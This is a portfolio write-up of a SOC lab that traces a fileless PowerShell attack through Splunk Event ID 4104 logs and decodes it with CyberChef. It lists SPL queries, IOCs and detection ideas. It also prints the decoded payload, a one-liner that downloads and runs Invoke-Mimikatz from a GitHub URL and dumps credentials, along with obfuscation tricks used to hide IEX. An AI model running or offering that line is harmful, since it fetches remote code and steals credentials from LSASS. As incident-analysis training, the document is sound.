# 🔎 Threat Hunting & Malware De-obfuscation with Splunk
### Investigating a Fileless PowerShell Mimikatz Attack

## 📌 Overview

In this project, I investigated a sophisticated **fileless PowerShell attack** using **Splunk Enterprise** and **CyberChef**. Acting as a SOC Analyst, I analyzed Windows PowerShell Script Block Logging (Event ID 4104) to uncover a heavily obfuscated malware payload designed to evade traditional antivirus and endpoint detection systems.

The investigation involved reconstructing fragmented PowerShell logs, decoding multiple layers of obfuscation, and identifying an in-memory credential dumping attack leveraging **Invoke-Mimikatz**.

---

## 🎯 Objectives

- Analyze Windows Event ID **4104** logs in Splunk
- Reconstruct fragmented PowerShell Script Blocks
- Identify Indicators of Compromise (IOCs)
- Reverse engineer an obfuscated PowerShell payload
- Reveal attacker objectives and malware behavior

---

# 🛠️ Technologies Used

- Splunk Enterprise
- CyberChef
- Kali Linux
- Windows PowerShell
- Windows Event ID 4104
- PowerShell Script Block Logging
- Threat Hunting
- Incident Response
- Malware Analysis

---

# 🏗️ Attack Scenario

A suspicious workstation generated an alert after executing an unknown PowerShell command.

The available evidence consisted of Windows PowerShell operational logs (`powershell_malicious.xml`) ingested into Splunk.

My responsibilities included:

- Investigating PowerShell Script Block logs
- Reassembling fragmented script blocks
- Identifying attacker obfuscation techniques
- Decoding malicious payloads
- Determining attacker intent

---

# 📈 Investigation Workflow

## Step 1 — Initial Log Investigation

Search the imported PowerShell logs.

```spl
source="powershell_malicious.xml" "ScriptBlockText"
```

This immediately exposed heavily obfuscated PowerShell containing randomized casing, split strings, and dynamically generated commands.

---

## Step 2 — Discovering Log Fragmentation

A simple table search returned incomplete results.

```spl
source="powershell_malicious.xml" "ScriptBlockText"
| table _time Event
```

Using Splunk's internal `_raw` field exposed the complete event.

```spl
source="powershell_malicious.xml" "ScriptBlockText"
| table _time _raw
```

This revealed that Windows had automatically fragmented the script across multiple Event ID 4104 records.

---

## Step 3 — Reconstructing the Payload

By correlating sequential events, I located the missing decimal character array responsible for generating the final PowerShell payload.

Example:

```powershell
73,69,88,32,40,78,101,119...
```

---

## Step 4 — De-obfuscation

The decimal array was copied into **CyberChef**.

Recipe:

- From Decimal
- Delimiter: Comma

CyberChef converted the decimal values into the original PowerShell command.

Decoded payload:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');
Invoke-Mimikatz -DumpCreds
```

---

# 🔐 Obfuscation Techniques Identified

## Mixed Case Obfuscation

```powershell
FOReacH-ObJect
-JoiN
-spLiT
```

---

## Character Length Cipher

```powershell
$_.Length - 1
```

Instead of storing ASCII values directly, the malware dynamically calculated characters based on string lengths.

---

## Dynamic Invoke-Expression

```powershell
.(''.IndexOf.ToString()[106,482,184]-join'')
```

The malware reconstructed the `IEX` command in memory to avoid detection.

---

# 🚨 Indicators of Compromise (IOCs)

| Indicator | Description |
|------------|-------------|
| Invoke-Mimikatz | Credential dumping utility |
| PowerSploit | Offensive PowerShell framework |
| Net.WebClient | Downloads payload directly into memory |
| raw.githubusercontent.com | Remote payload hosting |
| Invoke-Mimikatz -DumpCreds | Extracts credentials from LSASS |

---

# 🎯 Key Findings

- Successfully reconstructed fragmented PowerShell Script Blocks
- Bypassed Splunk UI truncation using `_raw`
- Decoded multiple layers of PowerShell obfuscation
- Identified a fileless malware execution chain
- Confirmed remote payload retrieval from GitHub
- Determined attacker objective was credential theft from LSASS

---

# 📚 Skills Demonstrated

- Threat Hunting
- Malware Analysis
- Splunk SPL
- Log Analysis
- Windows Event Forensics
- PowerShell Analysis
- Incident Response
- Threat Intelligence
- CyberChef
- Detection Engineering

---

# ⚠️ Challenges

One of the biggest challenges was understanding why the malicious script appeared incomplete.

Because:

- Windows automatically fragments large PowerShell scripts
- Splunk displays logs in reverse chronological order

The execution wrapper appeared before the payload itself, requiring manual reconstruction of multiple events to recover the complete attack chain.

---

# 🛡️ Detection Opportunities

Potential improvements to detect similar attacks include:

- Sigma rules for suspicious Event ID 4104 activity
- YARA signatures for PowerShell obfuscation
- Sysmon Event ID 10 monitoring for LSASS access
- PowerShell Constrained Language Mode (CLM)
- AppLocker or WDAC enforcement
- Network monitoring for suspicious `Net.WebClient` downloads

---

# 📸 Investigation Screenshots

Add your screenshots below.

## 1. Initial PowerShell Event Search

```
images/01-search-results.png
```

---

## 2. Discovering Fragmented Script Blocks

```
images/02-fragmented-events.png
```

---

## 3. Full Raw Event Inspection

```
images/03-raw-event.png
```

---

## 4. Obfuscated Decimal Array

```
images/04-decimal-array.png
```

---

## 5. CyberChef De-obfuscation

```
images/05-cyberchef.png
```

---

## 6. Decoded Mimikatz Payload

```
images/06-final-payload.png
```

---

# 📖 What I Learned

This project reinforced several important SOC and threat hunting concepts:

- Fileless malware often relies on legitimate Windows tools to evade detection.
- Event ID 4104 provides valuable visibility into PowerShell execution.
- Log fragmentation can obscure malicious activity unless events are reconstructed.
- Splunk's internal fields (`_raw`) are essential when investigating truncated logs.
- CyberChef is a powerful tool for decoding and analyzing obfuscated malware.

---

## 👤 Author

**Yvener Bazile**

Cloud Security • SOC Analyst • Threat Hunting • AWS • Splunk
